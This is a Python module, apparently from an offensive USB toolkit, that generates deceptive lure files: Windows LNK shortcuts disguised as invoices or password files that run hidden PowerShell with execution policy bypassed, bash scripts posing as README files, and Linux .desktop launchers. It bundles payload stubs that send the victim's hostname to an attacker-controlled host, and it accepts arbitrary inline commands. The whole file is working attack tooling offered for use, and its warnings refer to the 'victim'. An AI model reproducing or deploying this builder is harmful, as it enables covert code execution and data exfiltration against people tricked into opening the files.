"""
USB lure builder (Phase 5.2) — deceptive files that run a payload when opened.
Windows: LNK shortcuts · Linux: bash lure + .desktop entry
"""

import base64
import json
import os
import re
from pathlib import Path
from typing import Any, Optional

from config import USERS_DIR

_FILENAME_RE = re.compile(r"[^\w.\-]")

LURE_TYPES = [
    {
        "id": "lnk",
        "label": "LNK shortcut",
        "platform": "windows",
        "desc": "Double-click shortcut runs payload via cmd + PowerShell",
    },
    {
        "id": "bash_lure",
        "label": "Bash lure (README / install script)",
        "platform": "linux",
        "desc": "Shell script disguised as README or install instructions",
    },
    {
        "id": "desktop",
        "label": "Desktop entry (.desktop)",
        "platform": "linux",
        "desc": "GNOME/KDE shortcut that launches the payload",
    },
]

LURE_PRESETS = [
    {"id": "invoice", "label": "Invoice_2026", "windows": "Invoice_2026.lnk", "linux": "README.txt"},
    {"id": "vpn", "label": "VPN_Setup", "windows": "VPN_Setup.lnk", "linux": "install_vpn.sh"},
    {"id": "passwords", "label": "Passwords.txt", "windows": "Passwords.txt.lnk", "linux": "Passwords_README.txt"},
    {"id": "confidential", "label": "Confidential_DO_NOT_OPEN", "windows": "Confidential_DO_NOT_OPEN.lnk", "linux": "CONFIDENTIAL_README.txt"},
    {"id": "custom", "label": "Custom name", "windows": "", "linux": ""},
]

PAYLOAD_SOURCES = [
    {"id": "saved", "label": "Saved USB payload (Snarf or prior save)"},
    {"id": "stub_windows", "label": "Minimal Windows test stub (PowerShell)"},
    {"id": "stub_linux", "label": "Minimal Linux test stub (Bash)"},
    {"id": "inline", "label": "Custom inline command"},
]

COMPANION_PS1 = "_tsk_lure_payload.ps1"
COMPANION_SH = "_tsk_lure_payload.sh"


def _user_usb_dir(username: str) -> Path:
    base = (USERS_DIR / username / "payloads" / "usb").resolve()
    base.mkdir(parents=True, exist_ok=True)
    return base


def _safe_name(name: str, default: str = "lure") -> str:
    stem = _FILENAME_RE.sub("_", name.strip())[:64]
    return stem or default


def list_saved_scripts(username: str) -> list[dict]:
    base = _user_usb_dir(username)
    scripts = []
    for fpath in sorted(base.iterdir()):
        if not fpath.is_file() or fpath.name.startswith("."):
            continue
        ext = fpath.suffix.lower()
        if ext not in (".ps1", ".sh", ".py", ".bat"):
            continue
        scripts.append({
            "filename": fpath.name,
            "lang": "PS1" if ext == ".ps1" else "SH" if ext == ".sh" else ext.upper().strip("."),
            "size": fpath.stat().st_size,
        })
    return scripts


def get_options(username: str = "default") -> dict:
    return {
        "lure_types": LURE_TYPES,
        "presets": LURE_PRESETS,
        "payload_sources": PAYLOAD_SOURCES,
        "saved_scripts": list_saved_scripts(username),
        "companion_names": {"windows": COMPANION_PS1, "linux": COMPANION_SH},
    }


def _normalize(raw: dict, user_cfg: Optional[dict] = None) -> dict:
    cfg = user_cfg or {}
    lure_type = raw.get("lure_type") or "lnk"
    if lure_type not in {t["id"] for t in LURE_TYPES}:
        raise ValueError(f"Unknown lure type: {lure_type}")

    preset_id = raw.get("preset") or "invoice"
    preset = next((p for p in LURE_PRESETS if p["id"] == preset_id), LURE_PRESETS[0])
    custom = str(raw.get("custom_name") or "").strip()

    platform = "windows" if lure_type == "lnk" else "linux"
    if preset_id == "custom":
        if not custom:
            raise ValueError("Enter a custom lure name")
        lure_filename = custom
        if lure_type == "lnk" and not lure_filename.lower().endswith(".lnk"):
            lure_filename += ".lnk"
        if lure_type == "desktop" and not lure_filename.lower().endswith(".desktop"):
            lure_filename += ".desktop"
    else:
        lure_filename = preset["windows"] if platform == "windows" else preset["linux"]

    payload_source = raw.get("payload_source") or "saved"
    saved_file = str(raw.get("saved_payload") or "").strip()
    inline_cmd = str(raw.get("inline_command") or "").strip()

    return {
        "lure_type": lure_type,
        "platform": platform,
        "lure_filename": lure_filename,
        "payload_source": payload_source,
        "saved_payload": saved_file,
        "inline_command": inline_cmd,
        "lhost": str(raw.get("lhost") or cfg.get("lhost") or "127.0.0.1").strip(),
        "lport": str(raw.get("lport") or cfg.get("lport") or "1337").strip(),
        "catch_token": str(cfg.get("catch_token") or "").strip(),
        "desktop_title": str(raw.get("desktop_title") or "Important Documents").strip(),
    }


def _stub_ps1(lhost: str, lport: str, catch_token: str = "") -> str:
    ct_param = f"?ct={catch_token}" if catch_token else ""
    return (
        "# TSK lure payload stub\n"
        f"$url = 'http://{lhost}:{lport}/api/snarf{ct_param}'\n"
        "try {\n"
        "  $body = @{ hostname = $env:COMPUTERNAME; source = 'lure_stub';"
        " content = 'tsk2_lure_stub_ok'; filename = 'lure_check.txt' } | ConvertTo-Json\n"
        "  Invoke-RestMethod -Uri $url -Method Post -ContentType 'application/json'"
        " -Body $body -TimeoutSec 8\n"
        "} catch { }\n"
    )


def _stub_sh(lhost: str, lport: str, catch_token: str = "") -> str:
    ct_param = f"?ct={catch_token}" if catch_token else ""
    return (
        "#!/bin/bash\n"
        "# TSK lure payload stub\n"
        f"curl -s -X POST -H 'Content-Type: application/json' "
        f"-d \"{{\\\"hostname\\\":\\\"$(hostname)\\\",\\\"source\\\":\\\"lure_stub\\\","
        f"\\\"content\\\":\\\"tsk2_lure_stub_ok\\\",\\\"filename\\\":\\\"lure_check.txt\\\"}}\""
        f" 'http://{lhost}:{lport}/api/snarf{ct_param}' >/dev/null 2>&1 || true\n"
    )


def _resolve_payload(conf: dict, username: str) -> tuple[str, str, str]:
    """Return (payload_filename, content, lang)."""
    platform = conf["platform"]
    src = conf["payload_source"]

    if src == "saved":
        if not conf["saved_payload"]:
            raise ValueError("Select a saved payload script")
        base = _user_usb_dir(username)
        path = (base / conf["saved_payload"]).resolve()
        if not str(path).startswith(str(base)) or not path.is_file():
            raise ValueError("Saved payload not found")
        content = path.read_text(encoding="utf-8", errors="replace")
        ext = path.suffix.lower()
        if ext == ".ps1":
            lang, companion = "PS1", COMPANION_PS1
        elif ext == ".sh":
            lang, companion = "SH", COMPANION_SH
        else:
            lang, companion = "PY", path.name
        # Reference original filename on stick when using saved script
        return path.name, content, lang

    if src == "inline":
        if not conf["inline_command"]:
            raise ValueError("Enter a custom inline command")
        if platform == "windows":
            content = (
                f"# TSK inline lure\n"
                f"{conf['inline_command']}\n"
            )
            return COMPANION_PS1, content, "PS1"
        content = (
            "#!/bin/bash\n"
            f"{conf['inline_command']}\n"
        )
        return COMPANION_SH, content, "SH"

    if src == "stub_windows" or (src == "stub_linux" and platform == "windows"):
        return COMPANION_PS1, _stub_ps1(conf["lhost"], conf["lport"], conf.get("catch_token", "")), "PS1"

    return COMPANION_SH, _stub_sh(conf["lhost"], conf["lport"], conf.get("catch_token", "")), "SH"


def _build_lnk_bytes(payload_filename: str) -> bytes:
    try:
        from pylnk3 import for_file
    except ImportError:
        raise RuntimeError("pylnk3 is required - run: uv sync")

    ps_arg = (
        f'-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass '
        f'-File "%~dp0{payload_filename}"'
    )
    cmd_args = f'/c powershell {ps_arg}'
    cmd_exe = os.path.join(os.environ.get("SystemRoot", "C:\\Windows"), "System32", "cmd.exe")
    # pylnk3 expects Windows-style path string for local targets
    cmd_exe = cmd_exe.replace("/", "\\")
    if not cmd_exe[1] == ":":
        cmd_exe = "C:\\Windows\\System32\\cmd.exe"

    import tempfile
    with tempfile.NamedTemporaryFile(suffix=".lnk", delete=False) as tmp:
        tmp_path = tmp.name

    try:
        lnk = for_file(
            cmd_exe,
            arguments=cmd_args,
            work_dir="%~dp0",
            description="Document",
        )
        with open(tmp_path, "wb") as fh:
            lnk.save(fh)
        return Path(tmp_path).read_bytes()
    finally:
        Path(tmp_path).unlink(missing_ok=True)


def _build_bash_lure(lure_filename: str, payload_filename: str) -> str:
    return (
        f"#!/bin/bash\n"
        f"# README - open with: bash {lure_filename}\n"
        f"cd \"$(dirname \"$0\")\"\n"
        f"bash \"./{payload_filename}\"\n"
    )


def _build_desktop_lure(conf: dict, lure_filename: str, payload_filename: str) -> str:
    title = conf["desktop_title"] or "Important Documents"
    return (
        "[Desktop Entry]\n"
        "Type=Application\n"
        f"Name={title}\n"
        f"Exec=bash -c \"cd \\\"$(dirname \\\"%k\\\")\\\" && bash ./{payload_filename}\"\n"
        "Icon=folder\n"
        "Terminal=false\n"
    )


def build_lure(raw: dict, user_cfg: Optional[dict] = None, username: str = "default") -> dict:
    conf = _normalize(raw, user_cfg)
    payload_filename, payload_content, lang = _resolve_payload(conf, username)

    artifacts: list[dict] = []
    warnings: list[str] = []

    # Always bundle payload unless it's already the only file (saved uses original name)
    if conf["payload_source"] != "saved" or payload_filename.startswith("_tsk"):
        artifacts.append({
            "filename": payload_filename,
            "content": payload_content,
            "binary": False,
            "lang": lang,
        })

    if conf["lure_type"] == "lnk":
        lnk_bytes = _build_lnk_bytes(payload_filename)
        artifacts.insert(0, {
            "filename": conf["lure_filename"],
            "content_base64": base64.b64encode(lnk_bytes).decode("ascii"),
            "binary": True,
            "lang": "LNK",
        })
        warnings.append(
            "Flash the LNK and payload script together to the same folder on the USB stick."
        )
    elif conf["lure_type"] == "bash_lure":
        lure_content = _build_bash_lure(conf["lure_filename"], payload_filename)
        artifacts.insert(0, {
            "filename": conf["lure_filename"],
            "content": lure_content,
            "binary": False,
            "lang": "SH",
        })
        warnings.append("On Linux, victim may need to run: bash README.txt")
    else:
        desktop_content = _build_desktop_lure(conf, conf["lure_filename"], payload_filename)
        artifacts.insert(0, {
            "filename": conf["lure_filename"],
            "content": desktop_content,
            "binary": False,
            "lang": "DESKTOP",
        })
        warnings.append("Some desktops require marking the .desktop file as trusted.")

    if conf["payload_source"] == "saved":
        warnings.append(f"Flash lure together with saved script: {payload_filename}")

    package_files = [a["filename"] for a in artifacts]
    if conf["payload_source"] == "saved" and payload_filename not in package_files:
        package_files.append(payload_filename)

    return {
        "lure_type": conf["lure_type"],
        "platform": conf["platform"],
        "artifacts": artifacts,
        "package_files": package_files,
        "warnings": warnings,
    }


def _safe_artifact_path(base: Path, filename: str) -> Path:
    safe = _FILENAME_RE.sub("_", filename.strip())
    if not safe or safe.startswith("."):
        raise ValueError(f"Invalid filename: {filename}")
    dest = (base / safe).resolve()
    if not str(dest).startswith(str(base)):
        raise ValueError("Path outside user payload directory")
    return dest


_MANIFEST_FILE = ".lure_packages.json"


def _read_manifest(base: Path) -> dict:
    path = base / _MANIFEST_FILE
    if not path.is_file():
        return {}
    try:
        return json.loads(path.read_text(encoding="utf-8"))
    except Exception:
        return {}


def _write_manifest(base: Path, manifest: dict) -> None:
    path = base / _MANIFEST_FILE
    path.write_text(json.dumps(manifest, indent=2), encoding="utf-8")


def save_lure(username: str, artifacts: list[dict], package_files: list[str] | None = None) -> list[Path]:
    base = _user_usb_dir(username)
    written: list[Path] = []
    for art in artifacts:
        filename = art.get("filename") or ""
        dest = _safe_artifact_path(base, filename)
        if art.get("binary") and art.get("content_base64"):
            dest.write_bytes(base64.b64decode(art["content_base64"]))
        elif art.get("content") is not None:
            dest.write_text(str(art["content"]), encoding="utf-8")
            if filename.endswith(".sh") or filename.endswith(".txt") and "bash" in str(art.get("content", "")):
                try:
                    dest.chmod(dest.stat().st_mode | 0o111)
                except OSError:
                    pass
        else:
            raise ValueError(f"No content for {filename}")
        written.append(dest)

    if package_files:
        manifest = _read_manifest(base)
        for name in package_files:
            manifest[name] = package_files
        _write_manifest(base, manifest)

    return written


def get_lure_package_files(username: str, lure_filename: str) -> list[str]:
    """Return all files in the saved package for a given lure filename."""
    base = _user_usb_dir(username)
    manifest = _read_manifest(base)
    if lure_filename in manifest:
        return [f for f in manifest[lure_filename] if (base / f).is_file()]
    return [lure_filename] if (base / lure_filename).is_file() else []


def index_user_lures(username: str) -> list[dict]:
    """Index lure artifacts in user USB folder for payload browser."""
    base = _user_usb_dir(username)
    if not base.exists():
        return []

    lure_exts = {".lnk", ".desktop"}
    lure_names = {".txt", ".sh"}  # bash lure disguises
    payloads = []
    for fpath in sorted(base.iterdir()):
        if not fpath.is_file() or fpath.name.startswith("."):
            continue
        ext = fpath.suffix.lower()
        name_low = fpath.name.lower()
        is_lure = ext in lure_exts or (
            ext in lure_names and any(k in name_low for k in ("readme", "install", "password", "confidential", "vpn"))
        )
        if not is_lure:
            continue
        lang = "LNK" if ext == ".lnk" else "DESKTOP" if ext == ".desktop" else "SH"
        payloads.append({
            "name": fpath.stem.replace("_", " ").title(),
            "file": fpath.name,
            "path": str(fpath.resolve()),
            "cat": "LURES",
            "tags": ["LURE", "EXEC"],
            "lang": lang,
            "desc": "USB lure - flash with companion payload script",
        })
    return payloads


def list_lure_package_files(username: str, lure_filename: str) -> list[str]:
    """Files to copy when flashing a lure package (lure + companions)."""
    base = _user_usb_dir(username)
    lure_path = base / lure_filename
    if not lure_path.is_file():
        return []

    names = [lure_filename]
    for fpath in base.iterdir():
        if not fpath.is_file():
            continue
        if fpath.name == lure_filename:
            continue
        ext = fpath.suffix.lower()
        if ext in (".ps1", ".sh", ".py", ".bat"):
            names.append(fpath.name)
    return names
